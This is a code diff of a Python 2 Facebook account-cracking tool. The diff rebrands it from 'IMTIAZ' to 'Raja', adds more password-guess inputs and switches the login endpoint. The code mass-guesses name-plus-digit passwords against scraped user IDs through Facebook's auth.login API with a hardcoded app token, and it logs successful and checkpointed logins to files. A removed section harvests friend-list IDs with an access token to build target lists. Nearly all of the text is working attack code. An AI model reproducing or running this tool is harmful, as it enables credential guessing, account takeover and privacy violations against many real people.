                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'checkpoint' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass3
+                        cp = open('Raja-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -2238,14 +2221,14 @@ def xokp():
                             'pass': pass4,
                             'login': 'submit' })
                         if 'c_user' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass4
+                            ok = open('Raja-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'checkpoint' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass4
+                            cp = open('Raja-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
@@ -2267,14 +2250,14 @@ def xokp():
                                 'pass': pass5,
                                 'login': 'submit' })
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass5
-                                ok = open('IMTIAZ-ok.txt', 'a')
+                                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass5
+                                ok = open('Raja-ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass5
-                                cp = open('IMTIAZ-cp.txt', 'a')
+                                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass5
+                                cp = open('Raja-cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
@@ -2313,12 +2296,18 @@ def xoknp():
     print ''
     iiid = raw_input('[1] Enter ID : ')
     print ''
-    print ' Example 123 + 1234 +12 + 786'
+    print ' Example 123 + 1234 +12 + 786 + 1122 +khankhan + 12345 + 123456 + first last + First last'
     print ''
     ps1 = raw_input('[1] name + digit : ')
     ps2 = raw_input('[2] name + digit : ')
     ps3 = raw_input('[3] name + digit : ')
     ps4 = raw_input('[4] last + name  : ')
+    ps5 = raw_input('[5] name + digit : ')
+    ps6 = raw_input('[6] name + digit : ')
+    ps7 = raw_input('[7] name + digit : ')
+    ps8 = raw_input('[8] name + digit : ')
+    ps9 = raw_input('[9] name + digit : ')
+    ps10 = raw_input('[10] name + digit : ')
     print ''
     rrp = requests.get('https://graph.facebook.com/' + iiid + '?access_token=' + token)
     q = json.loads(rrp.text)
@@ -2666,14 +2655,14 @@ def xoknp():
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass1
+                ok = open('Raja-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass1
+                cp = open('Raja-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -2695,14 +2684,14 @@ def xoknp():
                     'pass': pass2,
                     'login': 'submit' })
                 if 'c_user' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass2
+                    ok = open('Raja-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'checkpoint' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass2
+                    cp = open('Raja-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -2724,14 +2713,14 @@ def xoknp():
                         'pass': pass3,
                         'login': 'submit' })
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass3
+                        ok = open('Raja-ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'checkpoint' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass3
+                        cp = open('Raja-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -2753,14 +2742,14 @@ def xoknp():
                             'pass': pass4,
                             'login': 'submit' })
                         if 'c_user' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass4
+                            ok = open('Raja-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'checkpoint' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass4
+                            cp = open('Raja-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
@@ -2782,14 +2771,14 @@ def xoknp():
                                 'pass': pass5,
                                 'login': 'submit' })
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass5
-                                ok = open('IMTIAZ-ok.txt', 'a')
+                                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass5
+                                ok = open('Raja-ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass5
-                                cp = open('IMTIAZ-cp.txt', 'a')
+                                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass5
+                                cp = open('Raja-cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
@@ -2926,81 +2915,81 @@ def n_p_pass():
             first = name.rsplit(' ')[0]
             last = name.rsplit(' ')[1]
             pass1 = name
-            data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
             q = json.loads(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass1
+                ok = open('Raja-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass1
+                cp = open('Raja-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
             else:
                 pass2 = first + ps1
-                data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
                 q = json.loads(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass2
+                    ok = open('Raja-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass2
+                    cp = open('Raja-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
                 else:
                     pass3 = first + ps2
-                    data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
                     q = json.loads(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass3
+                        ok = open('Raja-ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass3
+                        cp = open('Raja-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
                     else:
                         pass4 = first + ps3
-                        data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+                        data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
                         q = json.loads(data)
                         if 'access_token' in q:
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass4
+                            ok = open('Raja-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass4
+                            cp = open('Raja-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
                         else:
                             pass5 = last + ps4
-                            data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
                             q = json.loads(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass5
-                                ok = open('IMTIAZ-ok.txt', 'a')
+                                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass5
+                                ok = open('Raja-ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass5
-                                cp = open('IMTIAZ-cp.txt', 'a')
+                                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass5
+                                cp = open('Raja-cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
@@ -3152,65 +3141,65 @@ def p_p_pass():
         
         try:
             pass1 = ps1
-            data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
             q = json.loads(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass1
+                ok = open('Raja-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIWZ-cp.txt', 'a')
+                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass1
+                cp = open('Raja-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
             else:
                 pass2 = ps2
-                data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
                 q = json.loads(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass2
+                    ok = open('Raja-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass2
+                    cp = open('Raja-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
                 else:
                     pass3 = ps3
-                    data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
                     q = json.loads(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass3
+                        ok = open('Raja-ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass3
+                        cp = open('Raja-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
                     else:
                         pass4 = ps4
-                        data = requests.get('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
+                        data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers = header).text
                         q = json.loads(data)
                         if 'access_token' in q:
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass4
+                            ok = open('Raja-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass4
+                            cp = open('Raja-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
@@ -3234,1167 +3223,8 @@ def p_p_pass():
 
 
 def grap():
-    if dec in server:
-        pass
-    notf()
-    
-    try:
-        token = open('token.txt', 'r').read()
-    except:
-        1
-        os.system('clear')
-        print logo
-        print 39 * '-'
-        print '\x1b[1;92m\n[1] Login With Token'
-        print '\x1b[1;93m\n[0] Back'
-        print 39 * '-'
-        pp = raw_input('\x1b[1;94m\nSelect :\x1b[1;91m ')
-        if pp == '1':
-            os.system('clear')
-            print logo
-            print '\x1b[1;91m\n[*] Enter Your Token Hear'
-            print ''
-            tok = raw_input('\x1b[1;92m\n[*]PASTE TOKEN :\x1b[1;97m ')
-            j = open('token.txt', 'w')
-            j.write(tok)
-            j.close()
-            
-            try:
-                r = requests.get('https://graph.facebook.com/me?access_token=' + tok)
-                q = json.loads(r.text)
-                m = q['name']
-                print ''
-                print 'WELCOME : ' + m
-                time.sleep(2)
-                os.system('clear')
-                grap()
-            except requests.exceptions.ConnectionError:
-                print logo
-                print ''
-                print 'Trun On Data An Then \t'
-                print ''
-            except:
-                os.system('clear')
-                print ''
-                print ''
-                print '\x1b[1;91m     Your Token Is Expire'
-                time.sleep(3)
-                os.system('rm -rf token.txt')
-                os.system('rm -rf file.txt')
-                os.system('rm -rf newlinks.txt')
-                main_system()
-            
-
-        main_system()
-        print logo
-        print ''
-        print ''
-        print '\x1b[1;91m     [ File Making ]'
-        print ''
-        print '\x1b[1;92m  [ Maximum Limit 10 IDs ]'
-        print ''
-        c = raw_input('\x1b[1;96m[*] How Many Links Do You Want To Dump : ')
-        if c == '1':
-            ext1()
-        elif c == '2':
-            ext2()
-        elif c == '3':
-            ext3()
-        elif c == '4':
-            ext4()
-        elif c == '5':
-            ext5()
-        elif c == '6':
-            ext6()
-        elif c == '7':
-            ext7()
-        elif c == '8':
-            ext8()
-        elif c == '9':
-            ext9()
-        elif c == '10':
-            ext10()
-        else:
-            main_system()
-        main_system()
-
-
-
-def mineExt():
-    hok = 'jok.txt'
-    count = []
-    rana = []
-    
-    try:
-        token = open('token.txt', 'r').read()
-    except:
-        main_system()
-
-    os.system('clear')
-    print logo
-    print ''
-    iiid = raw_input('[*] Enter ID : ')
-    rrp = requests.get('https://graph.facebook.com/' + iiid + '?access_token=' + token)
-    q = json.loads(rrp.text)
-    nid = q['name']
-    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('look.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    print ''
-    print sm + '[*] Extracting From : ' + nid + ' > \x1b[1;91mFriends'
-    print ''
-    time.sleep(2)
-    print gu + '[*] Graping URLs ......' + w
-    print ''
-    time.sleep(2)
-    print g + '[*] Graping Complte Process Start *' + w
-    print ''
-    os.system(' cat look.txt | grep "100077" >> kk.txt')
-    os.system(' cat look.txt | grep "100078" >> kk.txt')
-    os.system('rm -rf look.txt')
-    file = open('kk.txt')
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
